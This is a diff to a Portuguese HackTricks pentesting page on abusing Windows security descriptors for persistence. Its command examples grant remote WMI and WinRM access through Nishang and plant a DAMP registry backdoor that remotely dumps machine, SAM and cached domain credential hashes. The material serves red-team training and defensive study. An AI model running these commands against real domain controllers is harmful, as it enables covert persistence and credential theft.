@@ -1,32 +1,32 @@
-# Descritores de segurança
+# Descritores de Segurança
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Descritores de segurança
+## Descritores de Segurança
 
-[Da documentação](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) define o formato usado para descrever um descritor de segurança. SDDL usa strings ACE para DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>
+Os descritores de segurança do Windows contêm um SID de proprietário, um SID de grupo primário, uma ACL discricionária (DACL) que controla o acesso e uma ACL de sistema (SACL) usada principalmente para auditoria. A Security Descriptor Definition Language (SDDL) é a representação textual; uma string ACE tem o formato `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** possui **sobre** um **objeto**. Se você conseguir **fazer** apenas uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.
+Um descritor de segurança armazena quem é o proprietário de um objeto protegível e quais principals têm permissão ou são impedidos de exercer direitos específicos sobre ele. Se um atacante puder alterar uma DACL, ele poderá conceder a um principal com poucos privilégios direitos que normalmente exigem uma função administrativa.
 
-Assim, esta técnica de persistence baseia-se na capacidade de obter todos os privilégios necessários sobre determinados objetos, permitindo executar uma tarefa que normalmente exige privilégios de administrador, mas sem a necessidade de ser administrador.
+Isso torna os descritores modificados de forma restrita úteis para persistence: a conta permanece fora de grupos privilegiados óbvios, enquanto mantém acesso a uma superfície de gerenciamento específica. Preserve o descritor original antes de testar, para que a alteração possa ser removida exatamente.
 
 ### Acesso ao WMI
 
 Você pode conceder a um usuário acesso para **executar WMI remotamente** [**usando isto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
 ```bash
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
 ```
 ### Acesso ao WinRM
 
-Dê acesso ao **winrm PS console a um usuário** [**usando isto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
+Conceda a um usuário acesso a um endpoint remoto do PowerShell/WinRM com a função `Set-RemotePSRemoting` do Nishang:<sup>[[2]](#references)</sup>
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
 ### Acesso remoto a hashes
 
-Acesse o **registry** e faça **dump de hashes** criando um **Reg backdoor usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que você possa, a qualquer momento, obter o **hash do computador**, o **SAM** e qualquer credencial **AD** em cache no computador. Portanto, é muito útil conceder essa permissão a um **usuário comum em um computador Domain Controller**:<sup>[[3]](#references)</sup>
+DAMP pode criar um backdoor de registry-ACL que posteriormente permite a recuperação remota do hash da conta da máquina, dos hashes SAM locais e das credenciais de domínio em cache. Conceder esses direitos restritos a uma conta comum — especialmente em um controlador de domínio — fornece uma persistência poderosa sem a necessidade de associação a grupos privilegiados.<sup>[[3]](#references)</sup>
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -40,12 +40,12 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-Confira [**Silver Tickets**](silver-ticket.md) para aprender como usar o hash da conta de computador de um Controlador de Domínio.
+Confira [**Silver Tickets**](silver-ticket.md) para aprender como você poderia usar o hash da conta de computador de um Domain Controller.
 
-## Referências
+## References
 
-- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
+- [1] [Linguagem de Definição de Descritores de Segurança - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
 - [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
-- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
-
+- [3] [DAMP - Projeto de Modificação de ACL Discricionária](https://github.com/HarmJ0y/DAMP)
+- [4] [Microsoft Learn — Formato de string do descritor de segurança](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
 {{#include ../../banners/hacktricks-training.md}}
